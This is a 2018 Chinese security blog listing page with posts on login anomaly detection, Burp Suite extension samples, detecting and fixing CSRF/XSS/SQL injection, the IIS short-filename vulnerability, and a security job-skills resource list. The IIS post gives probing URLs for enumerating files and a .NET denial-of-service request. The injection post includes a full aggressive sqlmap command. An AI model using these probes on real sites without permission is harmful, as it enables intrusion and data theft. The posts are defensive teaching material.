              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446875268619.html">
                
                  <h1>异常登录检测</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<p>异常登录功能用来检测服务器上的登录行为。<br/>
非常用地的登录行为告警（这个常用登陆地可以作为个人信息的一部分来由用户设置；或者收集第一次成功登录时的公网ip，然后将此ip地址设置位常用登陆地，从该时间往后顺延24小时内的所有公网登录地也会被记为常用登陆地，当超过24小时候，所有不在常用登陆地的登录行为均视为异地登录警告。当某个ip被判定为异地登录时，仅第一次登录行为进行告警，如果成功登录6次或以上，则默认将此ip的地点记录为常用登录地。）<br/>
非常用登录ip告警<br/>
非常用登录时间告警<br/>
非常用登录账号告警（同一时间段内超多次登录同一账号、同一时间段内不同地理位置登录账号、同一时间段内多个ip登录同一账号、不同设备登录同一账号、同一设备不同ip登录同一账号）</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:52 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8.html'>业务安全</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446874145620.html">
                
                  <h1>burpsuite插件编写之官方代码示例解读</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>description: 分析burpsuite官方提供的示例代码，以此来学习插件编写。</p>
</blockquote>

<h2 id="toc_0">HelloWorld</h2>

<p>废话不多说，直接上代码！</p>

<pre class="line-numbers"><code class="language-python">from burp import IBurpExtender
from java.io import PrintWriter
from java.lang import RuntimeException

# 上面import的第一句是所有burp插件都必须有的
# 下面开始创建一个burp插件的类来实现插件
class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        # 创建插件名
        callbacks.setExtensionName(&quot;HelloWorld extension&quot;)
        # 获取输出和错误流
        stdout = PrintWriter(callbacks.getStdout(), True)
        stderr = PrintWriter(callbacks.getStderr(), True)
        # 在输出流和错误流中插入消息
        stdout.println(&quot;Hello output&quot;)
        stderr.println(&quot;Hello errors&quot;)
        # 将消息插入burp的alert警报标签中
        callbacks.issueAlert(&quot;Hello alerts&quot;)
        # 抛出将出现在错误流中的异常
        raise RuntimeException(&quot;Hello exception&quot;)
</code></pre>

<p>现在开始来说几个坑：<br/>
1、插件最好尽量放在英文路径，不然可能会报错<br/>
2、编写代码前指定编码(如：# -<em>- coding:utf8 -</em>-)<br/>
3、raise RuntimeException(&quot;Hello exception&quot;) 这行代码我没看懂是要干嘛的，反正写了之后Errors就报错，不想看的话就注释掉好了。</p>

<h2 id="toc_1">event_listeners 事件监听器</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener
from burp import IProxyListener
from burp import IScannerListener
from burp import IExtensionStateListener
from java.io import PrintWriter

class BurpExtender(IBurpExtender, IHttpListener, IProxyListener, IScannerListener, IExtensionStateListener):
    def registerExtenderCallbacks(self, callbacks):
        # 保持对回调对象的引用
        self._callbacks = callbacks
        # 创建插件名
        callbacks.setExtensionName(&quot;Event Listeners&quot;)
        # 获取输出流
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        # 注册为http监听器
        callbacks.registerHttpListener(self)
        # 注册为proxy监听器
        callbacks.registerProxyListener(self)
        # 注册为scanner监听器
        callbacks.registerScannerListener(self)
        # 注册为扩展插件状态监听器
        callbacks.registerExtensionStateListener(self)
    # 下面几个函数各自实现监听
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        self._stdout.println(
            (&quot;HTTP request to &quot; if messageIsRequest else &quot;HTTP response from&quot;) +
            messageInfo.getHttpService().toString() +
            &quot;[&quot; + self._callbacks.getToolName(toolFlag) + &quot;]&quot;
        )

    def processProxyMessage(self, messageIsRequest, message):
        self._stdout.println(
            (&quot;Proxy request to &quot; if messageIsRequest else &quot;Proxy response from&quot;) +
            message.getMessageInfo.getHTTPService().toString()
        )

    def newScanIssue(self, issue):
        self._stdout.prinln(&quot;New scan issue &quot; + issue.getIssueName())

    def extensionUnloaded(self):
        self._stdout.println(&quot;Extension was unloaded&quot;)
</code></pre>

<p>我是没搞懂这个插件做了什么，诶无所谓，也就是多敲敲代码，熟悉熟悉感觉。</p>

<h2 id="toc_2">traffic_redirector 流量重定向</h2>

<pre class="line-numbers"><code class="language-python">#!/usr/bin/python3
# -*- coding:utf-8 -*-

from burp import IBurpExtender
from burp import IHttpListener

HOST_FROM = &quot;www.baidu.com&quot;
HOST_TO = &quot;www.zhihu.com&quot;

class BurpExtender(IBurpExtender, IHttpListener):
    def registerExtenderCallbacks(self, callbacks):
        # 获取扩展helpers对象
        self._helpers = callbacks.getHelpers()
        # 设置扩展名
        callbacks.setExtensionName(&quot;Traffic redirector&quot;)
        # 将自己注册为HTTP侦听器
        callbacks.registerHttpListener(self)

    def processHttpMessage(self, toolsFlag, messageIsRequest, messageInfo):
        # 只获取请求
        if not messageIsRequest:
            return
        # 获取http服务的请求
        httpService = messageInfo.getHttpService()
        # 如果主机是HOST_FROM则将它改成HOST_TO
        if (HOST_FROM == httpService.getHost()):
            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,
                httpService.getPort(), httpService.getProtocol()))
</code></pre>

<p>这个插件简单来说就是，把请求中的host部分修改掉。比如上述代码会监听所有host为百度的请求，一旦出现，就会把host改成知乎。</p>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:50 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E5%B7%A5%E5%85%B7.html'>工具</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446869314706.html">
                
                  <h1>xss、csrf、sql注入快速检测方法</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">CSRF跨站请求伪造</h2>

<ul>
<li>原理<br/>
攻击者在受害者不知情的情况下，以受害者的名义伪造请求发送给受攻击的站点，从而在未授权的情况下执行在权限保护之下的操作。<br/>
CSRF攻击的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
1.查看重要操作接口提交的请求中是否包含 csrf_token<br/>
2.更改和删除 csrf_token 后提交表单，查看请求是否能被正确响应。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.对涉及数据<strong>增、删、改</strong>操作提交的表单中添加csrf_token，token 参数应校验一次后失效。<br/>
2.最好是在容器或框架上<strong>全局</strong>启用 csrf_token。(很多框架自带的解决办法容易遗漏一次失效的问题)<br/>
3.token 应有一定的<strong>时效性</strong>，建议为30分钟，过期需失效（即：单页面停留30分钟后，用户提交请求需提示“页面过期，请刷新页面后再次提交”）<br/></li>
</ul>

<hr/>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005)">CSRF测试</a><br/>
<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">跨站请求伪造（CSRF）</a><br/>
<a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/">CSRF 攻击的应对之道</a><br/>
## XSS跨站脚本攻击<br/>
### 反射型</li>
<li>原理<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
<strong>检测场景</strong>：任何有输入输出地方......<br/>
1.使用通用的web扫描器一般的都能发掘潜在的反射型XSS漏洞。<br/>
2.手工在一些输入框中或者post参数中加入拼凑过的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在。<br/>
3.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的，反射型的XSS一般依赖于该次请求，且同时只能被用户自己所看到。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
</ul>

<hr/>

<h3 id="toc_1">存储型</h3>

<ul>
<li>原理<br/></li>
</ul>

<hr/>

<ul>
<li>检测方法<br/>
<strong>检测场景</strong>：存在富文本编辑器的地方；用户的输入信息会作为固定的值回显到页面中；后台管理应用中维护用户输入的相关信息。<br/>
1.手工在一些输入框中或者post参数中加入污染的JS代码，根据返回的页面源码中是否成功嵌入JS代码来判断XSS是否存在(注入前端转义的情况)。<br/>
2.如果注入的代码经过后端处理后，永久性的嵌入到了页面当中，则该XSS为存储型的。<br/>
3.如果尝试注入的代码在页面中均被html编码，则再考虑其数据的流转会不会在后台其他应用中处理这些输入数据，如果有，对应的后台应用是否也做了完善的过滤机制。<br/>
4.可远程搭建XSS检测平台，如果有XSS测试代码被触发，则自动发起链接到该平台上，这样相对来说可以测试那些未知的数据流向是否造成问题。<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/>
1.输出时统一使用 htmlEscape（）转义用户输入的数据，将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。<br/>
2.如果存在用户编写文章等类似用户可以自定义页面样式的功能，则限制用户输入，采用严格的白名单来过滤用户的输入，这种过滤应在后端应实现。(很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤)。<br/></li>
</ul>

<hr/>

<h3 id="toc_2">基于DOM型</h3>

<ul>
<li>原理<br/></li>
</ul>

<hr/>

<p>没啥可说的，可以当成是特殊的反射型。</p>

<ul>
<li>检测方法<br/></li>
</ul>

<hr/>

<ul>
<li>修复方案<br/></li>
</ul>

<hr/>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS跨站脚本</a>
## SQL_Inject<br/></li>
<li>原理<br/></li>
</ul>

<hr/>

<p>开发人员使用直接拼接 sql 的方法来访问数据库，导致攻击者能通过特殊构造的语句控制代码逻辑。典型的代码与数据没有分离导致的安全问题之一。</p>

<ul>
<li>检测方法<br/></li>
</ul>

<hr/>

<ul>
<li>常规方法<br/>
<code>
1 ，新建一个1 .txt文件，burp抓包将包含关键参数的请求存入。<br/>
2 ，使用sqlmap 进行扫描（python sqlmap [options] [file path]）<br/>
3、等待结果输出
</code></li>
<li>另一种常规方法<br/>
<code>
使用burp插件SQLiPy<br/>
方案一（通用）：将sqlapi地址配置成 192.168.2.22 2222<br/>
方案二：使用sqlipy生成测试语句，然后添加 -p 参数，指定注入参数，然后在 shell 里面运行 sqlmap。<br/>
一个指定参数的SqlMap示例语句：    <br/>
sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- cookie = “SESSIONID = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;<br/>
--user-agent= &quot;Mozilla / 5.0（X11; Linux_x86_64; RV：60.0）/ 20100101火狐/ 60.0&quot;  --delay=0 --timeout=30 --retries=0 --dbms=&quot;MySQL&quot;  --os=Linux   <br/>
--level=3 --risk=3 --threads=2 --time-sec=10 -b --batch --answers=&quot;crack=N,dict = N&quot;  -p &quot;zone_id&quot; --tables           
</code>
我们在跑注入的时候需要重点设置的参数：<br/>
-risk=3<br/>
-level=3<br/>
--threads=2<br/>
--dbms和–os去问开发或者测试<br/>
-p 指定阐述减少服务器压力</li>
<li>不太常规的方法<br/>
1、写一个web界面调用sqlmapapi<br/>
2、直接找开发拉代码过来进行审计</li>
<li>修复方案<br/></li>
</ul>

<hr/>

<p>1、使用安全的API ，完全避免使用解释器，或提供参数化界面的接口，或迁移到ORM 或实体框架(通常开发框架里会自带访问sql的方法来预防注入)。<br/><br/>
2、做参数绑定，预编译查询。</p>

<ul>
<li>参考<br/>
<a href="https://www.owasp.org/index.php/SQL_Injection">SQL注入</a></li>
</ul>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:42 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80.html'>奇淫巧技</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446866501207.html">
                
                  <h1>IIS短文件名漏洞</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<h2 id="toc_0">漏洞原理</h2>

<hr/>

<p>windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的（短）文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。    </p>

<h2 id="toc_1">利用场景</h2>

<hr/>

<p>1、用于猜解文件/文件名<br/><br/>
2、.Net Framework 的拒绝服务攻击（不常见）</p>

<h2 id="toc_2">检测方法</h2>

<hr/>

<p><strong>黑盒测试</strong><br/><br/>
使用<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS短文件名扫描器</a><br/><br/>
<strong>白盒测试</strong><br/>
几乎所有的 windows 操作系统，在 cmd 中使用命令：</p>

<pre class="line-numbers"><code class="language-bat">dir /x
</code></pre>

<p>如图：<br/>
<img src="media/15446866501207/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%BE%E7%A4%BA.png" alt="短文件名显示"/></p>

<h2 id="toc_3">修复方案</h2>

<hr/>

<p>1、升级 .net framework 至 4.0 版本或以上<br/><br/>
2、修改注册表键值<br/><br/>
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1。（此项默认为0）<br/><br/>
此设置用于禁用短文件名功能，重启后生效。<br/><br/>
或者通过 CMD 命令：    </p>

<pre class="line-numbers"><code class="language-txt">Windows Server 2008 R2
查询是否开启短文件名功能：fsutil 8dot3name query
关闭该功能：fsutil 8dot3name set 1

Windows Server 2003
关闭该功能：fsutil behavior set disable8dot3 1
</code></pre>

<p>以上操作只能防止新创建的文件/文件名不会出现短文件名，而当前文件/文件名依然保持短文件名。完整解决方案还需要如下操作：<br/><br/>
3、<br/><br/>
　　a、从当前目录中创建一个副本,并将其重命名为 tempNew；<br/><br/>
　　b、将当前目录重命名为“tempOld”；<br/><br/>
　　c、将“tempNew”重命名为原来的目录名。<br/><br/>
4、禁止 url 中使用 “~” 或它的 Unicode 编码。（IIS7.0的请求阻塞不能完全阻止“~”波浪号。）</p>

<hr/>

<hr/>

<hr/>

<h2 id="toc_4">背景知识</h2>

<hr/>

<p>windows 支持的长文件名最多为 255 个字符。windows 还以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 windows 的程序访问这些文件。<br/><br/>
8.3格式短文件名规范中：<br/><br/>
‘8’是指文件名或目录名的主体部分小于等于 8 个字节；‘3’是指文件名的扩展名部分小于等于 3 个字节。<br/><br/>
windows 会按以下方式从长文件名生成短文件名：<br/><br/>
windows 首先会删除文件名中的任何无效字符和空格。无效字符包括：</p>

<pre class="line-numbers"><code class="language-txt">.&quot;/\[]:;=,
</code></pre>

<p>由于短文件名只能包含一个英文句点（.），因此 windows 将删除文件名中的其他英文句点，即使文件名中最后一个英文句点后面是有效的非空格字符也是如此。例如：windows 从长文件名 This is a really long filename.123.456.789.txt 生成短文件名 Thisis~1.txt 否则，windows 将忽略最后一个英文句点，而使用倒数第二个英文句点。例如：windows从长文件名 This is a really long filename.123.456.789. 生成短文件名 Thisis~1.789。<br/><br/>
生成短文件名若需要复制的话，windows 将文件名截断为 6 个字符，并在后边附加一个波形符号（~）和一个数字（创建的每一个以 ~1 结尾的唯一文件名，复制文件以 ~2、~3等结尾。）    </p>

<h2 id="toc_5">影响范围</h2>

<hr/>

<p>Windows 10 Pro released in July 2015Windows 10 Enterprise released in July 2015Microsoft Windows Server 2003 Standard EditionMicrosoft Windows Server 2003 Enterprise EditionMicrosoft Windows Server 2003 Datacenter EditionMicrosoft Windows Server 2003 Web EditionMicrosoft Windows Server 2003, Enterprise x64 EditionMicrosoft Windows Small Business Server 2003 Standard EditionMicrosoft Windows Small Business Server 2003 Premium EditionMicrosoft Windows XP Home EditionMicrosoft Windows XP Professional EditionMicrosoft Windows Datacenter Server Limited EditionMicrosoft Windows Advanced Server, Limited EditionMicrosoft Windows 2000 ServerMicrosoft Windows 2000 Advanced ServerMicrosoft Windows 2000 Professional EditionMicrosoft Windows NT Workstation 3.5Microsoft Windows NT Workstation 3.51Microsoft Windows NT Workstation 4.0 开发员版Microsoft Windows NT Server 3.51Microsoft Windows NT Server 4.0 Standard EditionWindows Vista Service Pack 2Windows Vista BusinessWindows Vista EnterpriseWindows Vista Home PremiumWindows Vista UltimateWindows Server 2008 Service Pack 2Windows Server 2008 StandardWindows Server 2008 EnterpriseWindows Server 2008 DatacenterWindows Server 2008 for Itanium-Based SystemsWindows 7 Service Pack 1Windows 7 Home PremiumWindows 7 ProfessionalWindows 7 EnterpriseWindows 7 UltimateWindows Server 2008 R2 Service Pack 1Windows Server 2008 R2 StandardWindows Server 2008 R2 EnterpriseWindows Server 2008 R2 DatacenterWindows Server 2008 R2 for Itanium-Based SystemsWindows 8 EnterpriseWindows 8 ProWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 Datacenter<br/>
列表内所有操作系统均受影响（数据来源日期：20171213）<br/><br/>
该漏洞有其局限性：<br/><br/>
1、只能猜解文件/文件夹名前六位，以及扩展名前三位<br/><br/>
2、名称较短的文件是没有响应的短文件名的<br/><br/>
3、需要 IIS 和 .net 同时满足。  </p>

<h2 id="toc_6">漏洞详情</h2>

<hr/>

<p>在 windows 上的 Apache（Apache支持短文件名）上运行的 web 应用程序正在创建一个长文件名文件（如sql备份文件或会话文件，假设文件名是 backup-082119f75623eb7abd7bf357698ff66c.sql，windows 将创建短文件名 BACKUP〜1.SQL）。这种情况下，如果我们用短文件名访问这个文件，那么就有可能获取这个包含sql数据库备份的文件。<br/><br/>
比较著名的一个例子：<br/><br/>
wordpress 有一个备份博客的插件，该插件会为备份创建一个自定义目录（backup-88456）。备份完成后，该目录包含一个名为 wordpress_wp_20120702_576.sql 的文件  ，即 WordPress 数据库备份。这本应该难以猜测的，因为我们的目录名称中有5个数字加上日期和另外3个数字，即使忽略日期也至少有 100,000,000 个组合。然而由于短文件名的原因，目录名会变成 BACKUP~1 而文件名会变成 WORDPR~1.SQL。100,000,000 个组合被缩减为一个组合。    </p>

<h2 id="toc_7">漏洞利用</h2>

<hr/>

<p><strong>短文件名漏洞</strong><br/>
漏洞利用需要使用到通配符。在 windows 中，* 可以匹配n个字符（n可以为0,一个星号和n个星号的意义一样）。判断某站点是否存在 IIS 短文件名爆破，构造如下payload：    </p>

<pre class="line-numbers"><code class="language-http">1. http://www.xxx.com/*~1*/.aspx
2. http://www.xxx.com/l1j1e*~1*/.aspx
</code></pre>

<p>若1返回404而2返回400，则可以判断目标站点存在漏洞。<br/><br/>
判断漏洞存在后，继续猜解目录下是否存在a开头的文件或文件夹，访问：    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/a*~1*/.aspx
</code></pre>

<p>若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。<br/><br/>
到此要考虑两种情况，若abcdef开头的是一个文件夹则    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*/~1/.aspx
</code></pre>

<p>返回404。若abcdef开头的是一个文件，则    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1/.aspx
</code></pre>

<p>返回404（注意！返回404表示存在）同理我们可以猜出文件后缀名：    </p>

<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1*h*/.aspx
</code></pre>

<p>若返回404则代表扩展名中肯定存在h字符。<br/><br/>
利用此漏洞可以猜解后台地址、敏感文件/文件名（如备份的rar、bak、sql等）；某些情况下，可以通过短文件名漏洞直接下载对应的文件（如备份sql文件）。<br/><br/>
<br><br/>
<strong>.Net Framework 拒绝服务攻击</strong><br/><br/>
当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：        </p>

<pre class="line-numbers"><code class="language-http">\wwwtest\fuck~1\~1\~1\~1.aspx
</code></pre>

<p>此时文件系统会这样调用：    </p>

<pre class="line-numbers"><code class="language-txt">\wwwtest                           SUCCESS
\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest\fuck~1\~1\                PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
\wwwtest\fuck~1\~1                 PATH NOT FOUND
\wwwtest\fuck~1                    NAME NOT FOUND
\wwwtest                           SUCCESS
\wwwtest                           SUCCESS
</code></pre>

<p>如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。<br/><br/>
下表显示了每个请求的FS调用的数量（Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同)）<br/><br/>
<img src="media/15446866501207/F5%E8%B0%83%E7%94%A8.png" alt="F5调用"/></p>

<p>这个问题适用于当时的 .Net framework 的所有版本(<br/><br/>
    IIS 1.0, Windows NT 3.51<br/><br/>
    IIS 2.0, Windows NT 4.0<br/><br/>
    IIS 3.0, Windows NT 4.0 Service Pack 2<br/><br/>
    IIS 4.0, Windows NT 4.0 Option Pack<br/><br/>
    IIS 5.0, Windows 2000<br/><br/>
    IIS 5.1, Windows XP Professional and Windows XP Media Center Edition<br/><br/>
    IIS 6.0, Windows Server 2003 and Windows XP Professional x64 Edition<br/><br/>
    IIS 7.0, Windows Server 2008 and Windows Vista<br/><br/>
    IIS 7.5, Windows 7 (error remotely enabled or no web.config)<br/><br/>
    IIS 7.5, Windows 2008 (classic pipeline mode))<br/><br/>
只是 F5 的调用次数会有不同。    </p>

<h2 id="toc_8">参考链接</h2>

<hr/>

<ul>
<li><a href="http://www.lijiejie.com/iis-win8-3-shortname-brute/">http://www.lijiejie.com/iis-win8-3-shortname-brute/</a><br/></li>
<li><a href="https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/</a><br/></li>
<li><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a><br/></li>
<li><a href="https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions">https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions</a><br/></li>
<li><a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a><br/></li>
</ul>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:37 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
          					    <span class="posted-in"><a href='%E4%B8%AD%E9%97%B4%E4%BB%B6.html'>中间件</a></span>
          				   
                  </div>
                  <div class="more-right right">
                  <span class="comments">
                      

                       
                  </span>
                  </div>
                </div>
              </div><!-- article -->
        
			<div class="article">
                <a class="clearlink" href="15446864537652.html">
                
                  <h1>Web安全工程师求职清单</h1>
                  <div class="a-content">
                      
                      <div class="a-content-text">
                        
                        	<blockquote>
<p>一年前写的一点玩意，没什么卵用</p>
</blockquote>

<h2 id="toc_0">安全资讯</h2>

<p><a href="http://www.freebuf.com/">freebuf</a></p>

<p><a href="https://www.t00ls.net/">tools</a></p>

<p><a href="https://www.secpulse.com/">安全脉搏</a></p>

<p><a href="https://packetstormsecurity.com/">数据包风暴</a></p>

<p><a href="http://www.4hou.com/">嘶吼</a></p>

<p><a href="https://www.aqniu.com/">安全牛</a></p>

<p><a href="https://www.anquanke.com/">安全客</a></p>

<p><a href="https://www.sec-wiki.com/">sec-wiki</a></p>

<p><a href="http://www.secdoctor.com/">中国信息安全博士网</a></p>

<h2 id="toc_1">威胁情报</h2>

<p>暂略</p>

<h2 id="toc_2">安全工具</h2>

<p><a href="https://www.ctftools.com/down/">最强安全工具集</a></p>

<ul>
<li>burpsuite(抓包)</li>
<li>sqlmap(sql注入)</li>
<li>whireshark(网络抓包)</li>
<li>中国菜刀(webshell、一句话后门)</li>
<li>HxD(十六进制编辑器和磁盘编辑器)</li>
<li>nmap(扫描)</li>
<li>hydra(爆破)</li>
<li>cain(爆破)</li>
<li>metasploit(漏洞利用)</li>
<li>mitmproxy(http/https代理)</li>
<li>commix(命令注入)</li>
<li>httrack(网站克隆)</li>
<li>netcat(瑞士军刀-网络调试和探测工具)</li>
<li>scapy(python的交互式数据包操作程序和库)</li>
<li>empire(域渗透)</li>
</ul>

<h2 id="toc_3">靶机环境</h2>

<h2 id="toc_4">安全知识库</h2>

<p><a href="https://www.anquanquan.info/">安全圈</a></p>

<p><a href="http://wiki.open.qq.com/wiki/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83">腾讯安全开发规范</a></p>

<p><a href="https://highon.coffee/blog/cheat-sheet/">安全研究备忘单</a></p>

<p><a href="https://portswigger.net/kb/issues">Burp漏洞定义</a></p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">MSF框架终极指南</a></p>

<p><a href="https://www.owasp.org/index.php/Main_Page">OWASP</a></p>

<p><a href="http://vipread.com/index">vipread知识库</a></p>

<p><a href="https://kb.help.rapid7.com/docs/">Rapid7知识库</a></p>

<p><a href="https://kernelnewbies.org/">linux内核研究</a></p>

<p><a href="http://www.loner.fm/bugs/">乌云漏洞</a></p>

<p><a href="https://wooyun.js.org/">乌云文章</a></p>

<p><a href="http://www.office-cn.net/t/api/index.html?web.htm">WindowsAPI参考手册</a></p>

<p><a href="https://support.portswigger.net/customer/portal/articles/2326039-the-burp-methodology">Burp方法论</a></p>

<p><a href="https://ctf-wiki.github.io/ctf-wiki/">CTF-Wiki</a></p>

<p><a href="https://github.com/ctfs/">CTFs</a></p>

<p><a href="https://ctftime.org">ctftime</a></p>

<p><a href="https://www.codesec.net/">代码安全</a></p>

<p><a href="https://silic.wiki/doku.php">习科小黑板</a></p>

<p><a href="https://bbs.safewiki.org/portal.php">安全文库</a></p>

<p><a href="http://webscan.360.cn/vul">360网站常见漏洞</a></p>

<h2 id="toc_5">漏洞平台</h2>

<p><a href="https://butian.360.cn/">补天</a></p>

<p><a href="https://www.vulbox.com/">漏洞盒子</a></p>

<p><a href="https://www.bugbank.cn/">漏洞银行</a></p>

<p><a href="http://www.cnvd.org.cn/">CNVD国家信息安全漏洞共享平台</a></p>

<p><a href="https://src.edu-info.edu.cn/">教育行业漏洞报告平台</a></p>

<p><a href="https://www.seebug.org">Seebug</a></p>

<p><a href="http://0xsafe.org/vuldb.html">Vuldbs漏洞平台</a></p>

<h2 id="toc_6">技能要求</h2>

<ul>
<li>不同场景下的渗透测试流程、方法</li>
<li>常见漏洞的攻击方法和防御方法</li>
<li>代码级白盒测试能力</li>
<li>owasp_top10概念、原理、测试方法、防御方法</li>
<li>主流防火墙、IDS、IPS、漏洞扫描工具的安装、使用方法</li>
<li>熟悉python、php、javascript、c、c++等语言的一种或多种</li>
<li>cissp之类的证书或ctf解题能力是加分项</li>
<li>各种靶机环境搭建</li>
<li>安全分析报告的编写</li>
<li>对业务快速熟悉的能力（业务安全重点、应用范围划分、业务安全基线）</li>
<li>spring、struts、hibernate框架安全相关</li>
<li>web组件加固、服务器加固、数据库加固</li>
<li>域渗透、dns、arp等内网渗透知识</li>
<li>各类提权如系统提权、数据库提权等</li>
<li>风险评估、等级保护、安全体系规划、安全体系建设。包括信息资产管理、安全威胁和风险评估、安全解决方案制定、信息安全体系实施</li>
<li>Nginx、Apache、Tomcat等安全配置基线</li>
<li>各类安全测试标准(ISSAF、OSSTMM、OWASP、微软SDLC、OPENSAMM、BSIMM、SSECMM)</li>
<li>网络日志分析、攻击流量检测</li>
<li>hadoop、openstack、sdn云安全</li>
<li>mongodb、redis、HBASE等nosql安全</li>
<li>burpsuite插件编写</li>
<li>python脚本开发能力、shell脚本开发能力</li>
</ul>

                        
                      </div>
                  </div>
                </a>
                <div class="read-more clearfix">
                  <div class="more-left left">
                  
                    <span class="date">2018/12/13 15:34 下午</span>
                    <span>posted in&nbsp;</span> 
          				  
